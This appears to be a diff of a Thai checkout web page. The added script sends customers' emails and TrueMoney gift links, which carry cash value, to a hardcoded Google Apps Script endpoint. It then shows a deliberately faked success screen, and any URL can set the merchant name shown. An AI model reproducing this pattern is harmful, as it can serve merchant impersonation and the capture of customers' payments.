@@ -12,92 +12,43 @@
         tailwind.config = {
             theme: {
                 extend: {
-                    fontFamily: {
-                        sans: ['Inter', 'Prompt', 'sans-serif'],
-                    },
+                    fontFamily: { sans: ['Inter', 'Prompt', 'sans-serif'], },
                     colors: {
-                        slate: {
-                            850: '#1e293b', // Custom Dark Slate
-                            900: '#0f172a',
-                        },
-                        primary: '#3b82f6', // Blue 500
+                        slate: { 850: '#1e293b', 900: '#0f172a' },
+                        primary: '#3b82f6'
                     },
-                    boxShadow: {
-                        'soft': '0 4px 6px -1px rgba(0, 0, 0, 0.02), 0 2px 4px -1px rgba(0, 0, 0, 0.02)',
-                        'glow': '0 0 15px rgba(59, 130, 246, 0.5)',
-                    }
+                    boxShadow: { 'soft': '0 4px 6px -1px rgba(0, 0, 0, 0.02), 0 2px 4px -1px rgba(0, 0, 0, 0.02)' }
                 }
             }
         }
     </script>
-
     <style>
-        /* CSS สำหรับรอยหยักใบเสร็จ */
-        .receipt-jagged {
-            background-color: #f8fafc;
-            background-image: linear-gradient(135deg, #ffffff 50%, transparent 50%), linear-gradient(45deg, #ffffff 50%, transparent 50%);
-            background-position: bottom left; background-repeat: repeat-x; background-size: 16px 16px; 
-            filter: drop-shadow(0px 1px 0px #e2e8f0); 
-        }
-        
-        /* Input Transitions */
+        .receipt-jagged { background-image: linear-gradient(135deg, #ffffff 50%, transparent 50%), linear-gradient(45deg, #ffffff 50%, transparent 50%); background-position: bottom left; background-repeat: repeat-x; background-size: 16px 16px; filter: drop-shadow(0px 1px 0px #e2e8f0); }
         input, button, .method-card { transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1); }
-        
-        /* Payment Method Active States */
-        .method-active-pp { 
-            border-color: #3b82f6; 
-            background-color: #eff6ff; 
-            box-shadow: 0 0 0 1px #3b82f6; 
-        }
-        .method-active-tm { 
-            border-color: #f97316; 
-            background-color: #fff7ed; 
-            box-shadow: 0 0 0 1px #f97316; 
-        }
-
-        /* TrueMoney Input Animation */
-        .tm-input-wrapper { 
-            max-height: 0; 
-            opacity: 0; 
-            overflow: hidden; 
-            transform: translateY(-5px);
-            transition: all 0.3s ease-out; 
-        }
-        .tm-input-visible { 
-            max-height: 200px; 
-            opacity: 1; 
-            transform: translateY(0); 
-            margin-top: 1rem; 
-        }
-
-        /* Disable Zoom on Mobile Inputs */
+        .method-active-pp { border-color: #3b82f6; background-color: #eff6ff; box-shadow: 0 0 0 1px #3b82f6; }
+        .method-active-tm { border-color: #f97316; background-color: #fff7ed; box-shadow: 0 0 0 1px #f97316; }
+        .tm-input-wrapper { max-height: 0; opacity: 0; overflow: hidden; transform: translateY(-5px); transition: all 0.3s ease-out; }
+        .tm-input-visible { max-height: 200px; opacity: 1; transform: translateY(0); margin-top: 1rem; }
         input, select { font-size: 16px !important; }
     </style>
 </head>
 <body class="h-full font-sans text-slate-900 antialiased overflow-hidden selection:bg-blue-100 selection:text-blue-900">
 
     <div class="flex min-h-full flex-col md:flex-row h-screen overflow-y-auto md:overflow-hidden">
-        
         <div class="relative flex w-full flex-col justify-center bg-slate-900 px-8 py-12 md:w-[45%] lg:w-[40%] text-white shrink-0 overflow-hidden">
-            
             <div class="absolute top-0 right-0 -mr-20 -mt-20 w-96 h-96 rounded-full bg-blue-600 blur-[100px] opacity-20"></div>
             <div class="absolute bottom-0 left-0 -ml-20 -mb-20 w-80 h-80 rounded-full bg-indigo-600 blur-[80px] opacity-20"></div>
-
             <div class="relative z-10 max-w-md mx-auto w-full">
                 <div class="mb-8 inline-flex items-center gap-2 px-3 py-1 rounded-full bg-white/10 border border-white/10 backdrop-blur-sm">
                     <span class="w-2 h-2 rounded-full bg-green-400 animate-pulse"></span>
                     <span class="text-xs font-medium text-slate-200 tracking-wide">SECURE CHECKOUT</span>
                 </div>
-
                 <p class="text-slate-400 font-medium text-sm uppercase tracking-wider mb-2">Total Amount</p>
-                
                 <div class="flex items-baseline mb-8">
                     <span class="text-2xl text-slate-500 mr-3 font-light">THB</span>
                     <span class="text-6xl md:text-7xl font-bold tracking-tight text-white" id="displayAmount">0.00</span>
                 </div>
-                
                 <div class="h-px w-full bg-gradient-to-r from-slate-700 to-transparent mb-8"></div>
-                
                 <div class="flex items-start gap-4">
                     <div class="w-12 h-12 rounded-xl bg-slate-800 border border-slate-700 flex items-center justify-center shrink-0">
                         <i class="fa-solid fa-store text-xl text-blue-400"></i>
@@ -105,13 +56,8 @@
                     <div>
                         <p class="text-xs text-slate-500 uppercase font-bold tracking-wide mb-1">Payment For</p>
                         <h2 class="text-xl font-semibold text-white leading-tight" id="displayMerchant">Merchant Name</h2>
-                        
-                        <div id="displayNote" class="mt-2 hidden">
-                            <p class="text-sm text-slate-400 italic bg-slate-800/50 px-2 py-1 rounded inline-block border border-slate-700/50"></p>
-                        </div>
                     </div>
                 </div>
-                
                 <div class="mt-12 flex items-center gap-4 text-xs text-slate-500">
                     <span class="flex items-center gap-1.5"><i class="fa-solid fa-shield-halved"></i> SSL Encrypted</span>
                 </div>
@@ -120,7 +66,6 @@
 
         <div class="flex-1 flex flex-col justify-center bg-white px-6 py-12 md:px-12 lg:px-24 overflow-y-auto">
             <div class="w-full max-w-lg mx-auto space-y-8">
-                
                 <div class="text-center md:text-left">
                     <h1 class="text-2xl font-bold tracking-tight text-slate-900">Payment Details</h1>
                     <p class="text-sm text-slate-500 mt-1">Complete your purchase by providing your details.</p>
@@ -157,7 +102,6 @@
                     </div>
 
                     <div onclick="selectMethod('truemoney')" id="card-truemoney" class="method-card relative flex flex-col cursor-pointer rounded-xl border border-slate-200 p-4 hover:border-orange-300 group transition-all">
-                        
                         <div class="flex justify-between items-center w-full">
                             <div class="flex flex-1 items-center gap-4">
                                 <div class="w-10 h-10 rounded-lg bg-orange-50 flex items-center justify-center shrink-0">
@@ -169,12 +113,11 @@
                                 </div>
                             </div>
                             <div class="flex items-center gap-3">
-                                <img src="https://s.isanook.com/hi/0/ud/286/1432809/tw.jpg" class="h-6 object-contain opacity-80 group-hover:opacity-100 transition-opacity">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ca/True_Money_Wallet_logo.svg/1200px-True_Money_Wallet_logo.svg.png" class="h-6 object-contain opacity-80 group-hover:opacity-100 transition-opacity">
                                 <i id="check-tm" class="fa-solid fa-circle-check text-orange-500 text-xl hidden"></i>
                                 <i id="circle-tm" class="fa-regular fa-circle text-slate-300 text-xl"></i>
                             </div>
                         </div>
-
                         <div id="input-truemoney" class="tm-input-wrapper w-full cursor-auto">
                             <div class="bg-orange-50/50 p-4 rounded-lg border border-orange-100/50 mt-2">
                                 <label class="block text-xs font-bold text-orange-700 mb-1.5 uppercase tracking-wide">Paste Gift Link Here</label>
@@ -197,7 +140,7 @@
                 
                 <div class="pt-6 border-t border-slate-100 flex justify-center gap-6 opacity-40 grayscale hover:grayscale-0 transition-all duration-500">
                     <img src="https://upload.wikimedia.org/wikipedia/commons/c/c5/PromptPay-logo.png" class="h-5">
-                    <img src="https://s.isanook.com/hi/0/ud/286/1432809/tw.jpg" class="h-5">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ca/True_Money_Wallet_logo.svg/1200px-True_Money_Wallet_logo.svg.png" class="h-5">
                 </div>
 
             </div>
@@ -208,7 +151,6 @@
         <div class="fixed inset-0 bg-slate-900/90 backdrop-blur-sm transition-opacity"></div>
         <div class="fixed inset-0 z-10 w-screen overflow-y-auto">
             <div class="flex min-h-full items-center justify-center p-4 text-center">
-                
                 <div class="relative transform overflow-hidden rounded-2xl bg-white text-left shadow-2xl w-full max-w-sm border border-slate-100">
                     
                     <div id="scanView" class="hidden">
@@ -216,22 +158,14 @@
                             <div class="mb-4">
                                 <span class="bg-blue-50 text-blue-700 px-3 py-1 rounded-full text-[11px] font-bold uppercase tracking-wide border border-blue-100">Scan to Pay</span>
                             </div>
-                            
                             <h3 class="font-bold text-lg text-slate-900 mb-1">PromptPay QR</h3>
                             <p class="text-xs text-slate-500 mb-4">Open your banking app to scan</p>
-                            
                             <div class="relative bg-white p-2 rounded-2xl border-2 border-dashed border-blue-100 inline-block mb-4 shadow-sm group hover:border-blue-300 transition-colors">
                                 <img id="qrImage" src="" class="w-[200px] h-[200px] object-contain mix-blend-multiply rounded-lg">
-                                
-                                <div id="checkingOverlay" class="absolute inset-0 bg-white/90 backdrop-blur-sm hidden flex-col items-center justify-center z-20 rounded-lg">
-                                    <div class="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600 mb-2"></div>
-                                    <span class="text-xs font-bold text-blue-900 uppercase tracking-wide">Checking...</span>
-                                </div>
                             </div>
-                            
                             <div class="space-y-2.5">
-                                <button onclick="simulateCheckPayment()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3.5 rounded-xl shadow-lg shadow-blue-500/20 active:scale-95 transition-all flex justify-center items-center gap-2">
-                                    <i class="fa-solid fa-rotate-right"></i> Check Status
+                                <button id="btnConfirmPromptPay" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3.5 rounded-xl shadow-lg shadow-blue-500/20 active:scale-95 transition-all flex justify-center items-center gap-2">
+                                    <i class="fa-solid fa-paper-plane"></i> ยืนยันการโอนเงิน
                                 </button>
                                 <button onclick="closeModal()" class="w-full bg-white border border-slate-200 text-slate-600 font-bold py-3.5 rounded-xl hover:bg-slate-50 transition-colors">Cancel</button>
                             </div>
@@ -246,23 +180,20 @@
                                 <i class="fa-solid fa-wallet"></i>
                             </div>
                         </div>
-                        <h3 class="text-xl font-bold text-slate-900 mb-2">Verifying...</h3>
-                        <p class="text-sm text-slate-500">Checking your Gift Link with TrueMoney.</p>
-                        <p class="text-xs text-orange-500 mt-4 font-bold animate-pulse">Please do not close this window</p>
+                        <h3 class="text-xl font-bold text-slate-900 mb-2">Sending Data...</h3>
+                        <p class="text-sm text-slate-500">System is recording your transaction.</p>
+                        <p class="text-xs text-orange-500 mt-4 font-bold animate-pulse">Please wait...</p>
                     </div>
 
                     <div id="successView" class="hidden w-full bg-white">
                         <div class="px-6 pt-10 pb-6 text-center flex flex-col items-center">
-                            
                             <div class="w-20 h-20 rounded-full bg-green-50 border-4 border-green-100 flex items-center justify-center mb-6 shadow-sm">
                                 <i class="fa-solid fa-check text-4xl text-green-500"></i>
                             </div>
-
-                            <h3 class="text-2xl font-bold text-slate-800 mb-2">Payment Successful!</h3>
+                            <h3 class="text-2xl font-bold text-slate-800 mb-2">Payment Submitted</h3>
                             <p class="text-slate-500 mb-8 text-sm px-4">
-                                You have successfully paid <span id="successMerchantName" class="font-bold text-slate-900">Store</span>.
+                                Data sent successfully. Please wait for email confirmation.
                             </p>
-                            
                             <div class="w-full max-w-[280px] mx-auto filter drop-shadow-sm transition-transform hover:scale-105 duration-300">
                                 <div class="bg-slate-50 p-5 rounded-t-xl border-x border-t border-slate-200">
                                     <div class="flex justify-between items-baseline border-b border-dashed border-slate-300 pb-3 mb-3">
@@ -276,14 +207,13 @@
                                 </div>
                                 <div class="h-4 w-full bg-slate-50 relative receipt-jagged border-x border-slate-200/0"></div>
                             </div>
-                            
                             <div class="mt-8 pt-6 border-t border-slate-50 w-full">
                                 <p class="font-mono text-[10px] text-slate-400 mb-1 uppercase tracking-widest">Transaction ID</p>
-                                <p class="font-mono text-xs text-slate-600 font-bold select-all cursor-pointer hover:text-blue-600" id="txId">TXN-0000</p>
+                                <p class="font-mono text-xs text-slate-600 font-bold select-all cursor-pointer hover:text-blue-600" id="txId">PENDING</p>
                             </div>
                         </div>
                         <div class="p-4 border-t border-slate-50 bg-slate-50/50">
-                            <button onclick="closeModal()" class="w-full rounded-xl bg-slate-900 px-6 py-4 text-sm font-bold text-white shadow-lg hover:bg-slate-800 transition-all">Close Receipt</button>
+                            <button onclick="closeModal()" class="w-full rounded-xl bg-slate-900 px-6 py-4 text-sm font-bold text-white shadow-lg hover:bg-slate-800 transition-all">Close</button>
                         </div>
                     </div>
 
@@ -292,9 +222,120 @@
         </div>
     </div>
 
-    <script src="script.js"></script>
     <script>
+        // ✅ URL ของ Google Apps Script ของคุณ
+        const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzoIkNEuj97HXA999yMfPlIe7ypnEyUItV46Egh4jkMDyS_zmkaDDavvMZJ1JP2Q8sj/exec";
+
+        let currentAmount = "0.00";
+        let promptpayID = "0925384159"; 
         let selectedMethod = 'promptpay';
+
+        window.onload = function() {
+            loadData();
+        };
+
+        function loadData() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const paramAmount = urlParams.get('amount');
+            const paramMerchant = urlParams.get('merchant');
+            
+            if (paramMerchant) {
+                document.getElementById('displayMerchant').innerText = paramMerchant;
+            } else if(localStorage.getItem('merchantName')) {
+                document.getElementById('displayMerchant').innerText = localStorage.getItem('merchantName');
+            }
+
+            const rawAmount = paramAmount || localStorage.getItem('amount') || "0";
+            currentAmount = parseFloat(rawAmount).toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+            document.getElementById('displayAmount').innerText = currentAmount;
+            document.getElementById('btnAmount').innerText = currentAmount;
+
+            if(localStorage.getItem('promptpayID')) {
+                promptpayID = localStorage.getItem('promptpayID');
+            }
+        }
+
+        async function sendToGoogleSheet(payload) {
+            // Show Loading
+            document.getElementById("qrModal").classList.remove('hidden');
+            document.getElementById("scanView").classList.add('hidden');
+            document.getElementById("loadingView").classList.remove('hidden');
+            document.getElementById("successView").classList.add('hidden');
+
+            try {
+                await fetch(GOOGLE_SCRIPT_URL, {
+                    method: "POST",
+                    mode: "no-cors", 
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload),
+                });
+
+                // Fake Success delay
+                setTimeout(() => {
+                    showSuccessScreen(payload.type, payload.amount);
+                }, 1500);
+
+            } catch (error) {
+                closeModal();
+                alert("Error sending data: " + error.message);
+            }
+        }
+
+        function generateQR() {
+            const email = document.getElementById('customerEmail').value;
+            if(!email.includes('@')) { alert('กรุณากรอกอีเมลให้ถูกต้อง'); return; }
+
+            const rawAmount = currentAmount.replace(/,/g, '');
+            
+            // Show QR Modal
+            document.getElementById("qrModal").classList.remove('hidden');
+            document.getElementById("scanView").classList.remove('hidden');
+            document.getElementById("loadingView").classList.add('hidden');
+            document.getElementById("successView").classList.add('hidden');
+            
+            document.getElementById("qrImage").src = `https://promptpay.io/${promptpayID}/${rawAmount}`;
+
+            // Setup Confirm Button
+            const btn = document.getElementById("btnConfirmPromptPay");
+            btn.onclick = function() {
+                sendToGoogleSheet({
+                    type: 'PromptPay',
+                    amount: currentAmount,
+                    merchant: document.getElementById('displayMerchant').innerText,
+                    email: email,
+                    note: 'ลูกค้าแจ้งโอนผ่าน QR'
+                });
+            };
+        }
+
+        function payWithTrueMoney() {
+            const email = document.getElementById('customerEmail').value;
+            const link = document.getElementById('angpaoLink').value;
+
+            if(!email.includes('@')) { alert('กรุณากรอกอีเมลให้ถูกต้อง'); return; }
+            if (!link.includes('gift.truemoney.com')) { alert('ลิงก์ซองของขวัญไม่ถูกต้อง'); return; }
+
+            sendToGoogleSheet({
+                type: 'TrueMoney',
+                amount: currentAmount,
+                merchant: document.getElementById('displayMerchant').innerText,
+                email: email,
+                note: 'Link: ' + link 
+            });
+        }
+
+        function showSuccessScreen(method, amount) {
+            document.getElementById('scanView').classList.add('hidden');
+            document.getElementById('loadingView').classList.add('hidden');
+            document.getElementById('successView').classList.remove('hidden');
+            
+            document.getElementById('receiptAmount').innerText = amount;
+            document.getElementById('receiptMethod').innerText = method === 'PromptPay' ? 'QR SCAN' : 'TMN GIFT';
+        }
+
+        function closeModal() {
+            document.getElementById("qrModal").classList.add('hidden');
+        }
 
         function selectMethod(method) {
             selectedMethod = method;
@@ -302,45 +343,33 @@
             const cardTM = document.getElementById('card-truemoney');
             const inputTM = document.getElementById('input-truemoney');
             
-            // Icons
             const checkPP = document.getElementById('check-pp'); const circlePP = document.getElementById('circle-pp');
             const checkTM = document.getElementById('check-tm'); const circleTM = document.getElementById('circle-tm');
-            
-            // Button
             const btn = document.getElementById('mainPayBtn');
 
             if (method === 'promptpay') {
-                // Activate PromptPay
-                cardPP.classList.add('method-active-pp');
-                checkPP.classList.remove('hidden'); circlePP.classList.add('hidden');
-
-                // Deactivate TrueMoney
-                cardTM.classList.remove('method-active-tm');
+                cardPP.classList.add('method-active-pp'); cardTM.classList.remove('method-active-tm');
                 inputTM.classList.remove('tm-input-visible');
+                
+                checkPP.classList.remove('hidden'); circlePP.classList.add('hidden');
                 checkTM.classList.add('hidden'); circleTM.classList.remove('hidden');
 
-                // Update Button
                 const amt = document.getElementById('btnAmount').innerText;
                 btn.innerHTML = `<span>Pay THB <span id="btnAmount">${amt}</span></span> <i class="fa-solid fa-arrow-right text-xs opacity-70"></i>`;
                 btn.className = "w-full rounded-xl bg-slate-900 px-6 py-4 text-sm font-bold text-white shadow-lg hover:bg-slate-800 transition-all active:scale-[0.98] flex items-center justify-center gap-2";
 
             } else {
-                // Activate TrueMoney
-                cardTM.classList.add('method-active-tm');
+                cardTM.classList.add('method-active-tm'); cardPP.classList.remove('method-active-pp');
                 inputTM.classList.add('tm-input-visible');
-                checkTM.classList.remove('hidden'); circleTM.classList.add('hidden');
 
-                // Deactivate PromptPay
-                cardPP.classList.remove('method-active-pp');
+                checkTM.classList.remove('hidden'); circleTM.classList.add('hidden');
                 checkPP.classList.add('hidden'); circlePP.classList.remove('hidden');
                 
-                // Update Button
                 btn.innerHTML = `<span>Confirm Gift Link</span> <i class="fa-solid fa-gift text-xs opacity-70"></i>`;
                 btn.className = "w-full rounded-xl bg-orange-600 px-6 py-4 text-sm font-bold text-white shadow-lg shadow-orange-500/30 hover:bg-orange-700 transition-all active:scale-[0.98] flex items-center justify-center gap-2";
             }
         }
         
-        // Prevent click inside input from triggering card selection
         document.getElementById('angpaoLink').addEventListener('click', function(e) { e.stopPropagation(); });
 
         function handlePayment() {
@@ -352,7 +381,4 @@
         }
     </script>
 </body>
-
 </html>
-
-
